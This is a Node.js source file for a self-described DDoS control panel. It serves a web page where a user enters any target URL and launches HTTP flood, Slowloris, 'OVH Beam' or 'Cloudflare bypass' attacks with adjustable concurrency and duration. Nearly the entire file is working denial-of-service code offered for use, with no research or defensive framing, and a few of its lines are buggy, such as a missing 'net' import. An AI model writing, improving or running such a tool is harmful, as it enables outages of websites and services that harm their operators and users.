// server.js - High-Performance Node.js DDoS Panel (50k Request Capable)
const fastify = require('fastify')({ 
    logger: false,          // Disable logging for performance
    disableRequestLogging: true,
    connectionTimeout: 10000 // 10s timeout
});

const http = require('http');
const https = require('https');
const { Worker } = require('worker_threads');
const path = require('path');
const fs = require('fs');

// Connection pooling for outgoing requests
const httpAgent = new http.Agent({
    keepAlive: true,
    maxSockets: 500,        // Max concurrent outbound sockets
    maxFreeSockets: 50,
    timeout: 60000
});

const httpsAgent = new https.Agent({
    keepAlive: true,
    maxSockets: 500,
    maxFreeSockets: 50,
    timeout: 60000
});

// Attack state
let currentAttack = null;
let attackStartTime = null;
let stats = {
    requestsSent: 0,
    connections: 0,
    errors: 0
};

// User agents (abbreviated for speed)
const UA_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) Chrome/119.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1) Version/17.1 Mobile/15E148'
];

function randomUA() {
    return UA_LIST[Math.floor(Math.random() * UA_LIST.length)];
}

// High-performance HTTP flood (50k target)
function startHttpFlood(target, duration, concurrency = 500) {
    const parsed = new URL(target);
    const agent = parsed.protocol === 'https:' ? httpsAgent : httpAgent;
    const options = {
        method: 'GET',
        headers: {
            'User-Agent': randomUA(),
            'Accept': '*/*',
            'Connection': 'keep-alive'
        },
        agent: agent,
        timeout: 5000
    };

    let activeRequests = 0;
    const endTime = Date.now() + (duration * 1000);
    
    const interval = setInterval(() => {
        // Spawn requests up to concurrency limit
        while (activeRequests < concurrency && Date.now() < endTime) {
            activeRequests++;
            
            const req = http.request(target, options, (res) => {
                res.on('data', () => {}); // Drain
                res.on('end', () => {
                    stats.requestsSent++;
                    activeRequests--;
                });
            });
            
            req.on('error', () => {
                stats.errors++;
                activeRequests--;
            });
            
            req.end();
        }
        
        // Stop if time expired
        if (Date.now() >= endTime) {
            clearInterval(interval);
        }
    }, 10); // Check every 10ms
    
    return () => clearInterval(interval);
}

// Slowloris - memory-light connection holder
function startSlowloris(target, duration) {
    const parsed = new URL(target);
    const host = parsed.hostname;
    const port = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
    
    const sockets = [];
    const endTime = Date.now() + (duration * 1000);
    
    const interval = setInterval(() => {
        // Create new slow connections
        for (let i = 0; i < 20; i++) {
            if (sockets.length >= 300) break; // Cap at 300
            
            const socket = new net.Socket();
            socket.connect(port, host, () => {
                socket.write(`GET /${Math.random()} HTTP/1.1\r\nHost: ${host}\r\n`);
                // Don't finish headers
                stats.connections++;
            });
            
            socket.on('error', () => {
                const idx = sockets.indexOf(socket);
                if (idx > -1) sockets.splice(idx, 1);
                stats.connections--;
            });
            
            sockets.push(socket);
        }
        
        // Send keep-alive bytes to existing sockets
        sockets.forEach(socket => {
            try {
                socket.write(`X-a: ${Math.random()}\r\n`);
            } catch (e) {
                // Socket dead, remove
                const idx = sockets.indexOf(socket);
                if (idx > -1) sockets.splice(idx, 1);
                stats.connections--;
            }
        });
        
        // Stop if time expired
        if (Date.now() >= endTime) {
            clearInterval(interval);
            sockets.forEach(s => s.destroy());
        }
    }, 1000);
    
    return () => {
        clearInterval(interval);
        sockets.forEach(s => s.destroy());
    };
}

// OVH Beam method
function startOvhBeam(target, duration, concurrency = 400) {
    const parsed = new URL(target);
    const agent = parsed.protocol === 'https:' ? httpsAgent : httpAgent;
    
    let activeRequests = 0;
    const endTime = Date.now() + (duration * 1000);
    
    const interval = setInterval(() => {
        while (activeRequests < concurrency && Date.now() < endTime) {
            activeRequests++;
            
            const options = {
                method: 'GET',
                headers: {
                    'User-Agent': randomUA(),
                    'Accept': 'text/html,application/xhtml+xml',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'max-age=0',
                    'TE': 'Trailers'
                },
                agent: agent
            };
            
            const req = http.request(target, options, (res) => {
                res.on('data', () => {});
                res.on('end', () => {
                    stats.requestsSent++;
                    activeRequests--;
                });
            });
            
            req.on('error', () => {
                stats.errors++;
                activeRequests--;
            });
            
            req.end();
        }
        
        if (Date.now() >= endTime) {
            clearInterval(interval);
        }
    }, 10);
    
    return () => clearInterval(interval);
}

// Cloudflare bypass method
function startCfBypass(target, duration, concurrency = 350) {
    const parsed = new URL(target);
    const agent = parsed.protocol === 'https:' ? httpsAgent : httpAgent;
    
    let activeRequests = 0;
    const endTime = Date.now() + (duration * 1000);
    
    const interval = setInterval(() => {
        while (activeRequests < concurrency && Date.now() < endTime) {
            activeRequests++;
            
            const randomPath = `/${Math.random().toString(36).substring(7)}/${Math.random().toString(36).substring(7)}`;
            const url = `${target}${randomPath}`;
            
            const options = {
                method: 'GET',
                headers: {
                    'User-Agent': randomUA(),
                    'Accept': '*/*',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                },
                agent: agent
            };
            
            const req = http.request(url, options, (res) => {
                res.on('data', () => {});
                res.on('end', () => {
                    stats.requestsSent++;
                    activeRequests--;
                });
            });
            
            req.on('error', () => {
                stats.errors++;
                activeRequests--;
            });
            
            req.end();
        }
        
        if (Date.now() >= endTime) {
            clearInterval(interval);
        }
    }, 10);
    
    return () => clearInterval(interval);
}

// Attack method registry
const methods = {
    http_flood: startHttpFlood,
    slowloris: startSlowloris,
    ovh_beam: startOvhBeam,
    cf_bypass: startCfBypass
};

// HTML interface
const html = `
<!DOCTYPE html>
<html>
<head>
    <title>⚡ NODE 50K DDOS PANEL ⚡</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #0f0; margin: 40px; }
        .container { max-width: 600px; margin: auto; border: 2px solid #0f0; padding: 20px; }
        input, select, button { width: 100%; padding: 8px; margin: 8px 0; background: #1a1a1a; color: #0f0; border: 1px solid #0f0; }
        button { cursor: pointer; font-weight: bold; font-size: 16px; }
        button:hover { background: #0f0; color: #000; }
        .status { padding: 10px; border: 1px solid #0f0; margin: 20px 0; text-align: center; font-size: 18px; }
        .stats { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin: 15px 0; }
        .stat-box { border: 1px solid #0f0; padding: 10px; text-align: center; }
        .stat-value { font-size: 24px; font-weight: bold; }
        .stat-label { font-size: 12px; color: #8f8; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ 50K REQUEST DDOS PANEL ⚡</h1>
        <div class="status" id="status">⚪ IDLE</div>
        
        <div class="stats">
            <div class="stat-box">
                <div class="stat-value" id="reqCount">0</div>
                <div class="stat-label">REQUESTS SENT</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="connCount">0</div>
                <div class="stat-label">CONNECTIONS</div>
            </div>
        </div>
        
        <label>Target URL (https://example.com or http://ip:port)</label>
        <input id="target" placeholder="https://example.com">
        
        <label>Duration (seconds)</label>
        <input id="duration" type="number" value="60" min="1" max="3600">
        
        <label>Concurrency (100-1000, higher = more RAM)</label>
        <input id="concurrency" type="number" value="400" min="100" max="1000">
        
        <label>Attack Method</label>
        <select id="method">
            <option value="http_flood">HTTP Flood (50k target)</option>
            <option value="slowloris">Slowloris (low RAM)</option>
            <option value="ovh_beam">OVH BEAM</option>
            <option value="cf_bypass">Cloudflare Bypass</option>
        </select>
        
        <button onclick="startAttack()">🚀 START ATTACK</button>
        <button onclick="stopAttack()">⛔ STOP ATTACK</button>
        
        <p style="text-align: center; font-size: 12px; color: #8f8; margin-top: 20px;">
            Memory: 512MB limit • Concurrency 400-600 recommended
        </p>
    </div>
    
    <script>
        let statusInterval;
        
        async function updateStatus() {
            const res = await fetch('/status');
            const data = await res.json();
            document.getElementById('status').innerText = data.running ? '🔥 ATTACK RUNNING 🔥' : '⚪ IDLE';
            document.getElementById('reqCount').innerText = data.stats.requestsSent.toLocaleString();
            document.getElementById('connCount').innerText = data.stats.connections.toLocaleString();
        }
        
        async function startAttack() {
            const target = document.getElementById('target').value;
            const duration = document.getElementById('duration').value;
            const method = document.getElementById('method').value;
            const concurrency = document.getElementById('concurrency').value;
            
            if (!target) return alert('Enter target URL');
            
            const res = await fetch('/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({target, duration, method, concurrency: parseInt(concurrency)})
            });
            const data = await res.json();
            if (data.success) {
                updateStatus();
                statusInterval = setInterval(updateStatus, 1000);
            } else {
                alert(data.message);
            }
        }
        
        async function stopAttack() {
            const res = await fetch('/stop', {method: 'POST'});
            const data = await res.json();
            if (data.success) {
                if (statusInterval) clearInterval(statusInterval);
                updateStatus();
            }
        }
        
        // Auto-refresh status
        setInterval(updateStatus, 1000);
        updateStatus();
    </script>
</body>
</html>
`;

// Fastify routes
fastify.get('/', (req, reply) => {
    reply.type('text/html').send(html);
});

fastify.get('/status', (req, reply) => {
    reply.send({
        running: currentAttack !== null,
        stats: stats
    });
});

fastify.post('/start', (req, reply) => {
    const { target, duration, method, concurrency = 400 } = req.body;
    
    if (!target || !duration || !method) {
        return reply.status(400).send({ success: false, message: 'Missing parameters' });
    }
    
    if (currentAttack) {
        clearInterval(currentAttack);
        currentAttack = null;
    }
    
    if (!methods[method]) {
        return reply.status(400).send({ success: false, message: 'Invalid method' });
    }
    
    // Reset stats
    stats = { requestsSent: 0, connections: 0, errors: 0 };
    
    // Start attack
    currentAttack = methods[method](target, parseInt(duration), parseInt(concurrency));
    
    // Auto-stop after duration
    setTimeout(() => {
        if (currentAttack) {
            clearInterval(currentAttack);
            currentAttack = null;
        }
    }, duration * 1000);
    
    reply.send({ success: true });
});

fastify.post('/stop', (req, reply) => {
    if (currentAttack) {
        clearInterval(currentAttack);
        currentAttack = null;
        reply.send({ success: true });
    } else {
        reply.send({ success: false, message: 'No attack running' });
    }
});

// Start server
const port = process.env.PORT || 5000;
fastify.listen({ port: port, host: '0.0.0.0' }, (err) => {
    if (err) {
        console.error(err);
        process.exit(1);
    }
    console.log(`⚡ 50K DDoS panel running on port ${port}`);
});
